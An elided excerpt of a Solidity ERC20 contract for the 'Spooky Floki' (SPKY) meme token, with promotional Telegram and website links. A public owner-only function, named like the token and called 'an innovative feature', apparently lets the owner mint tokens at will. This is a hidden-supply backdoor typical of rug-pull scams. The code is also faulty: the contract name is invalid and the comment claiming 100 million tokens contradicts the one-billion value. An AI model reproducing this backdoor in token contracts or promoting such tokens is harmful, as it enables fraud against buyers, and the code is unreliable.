//
// $SpookyFloki proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SpookyFlokientry
// 📱 Website ::http://www.spookyfloki.vip/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SpookyFloki(uint256 amount) public onlyOwner {
 _SpookyFloki(msg.sender, amount);
    }
    ...
    function _SpookyFloki(address account, uint256 amount) internal virtual {
...
contract $SpookyFloki is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Spooky Floki", "SPKY") {
     _SpookyFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}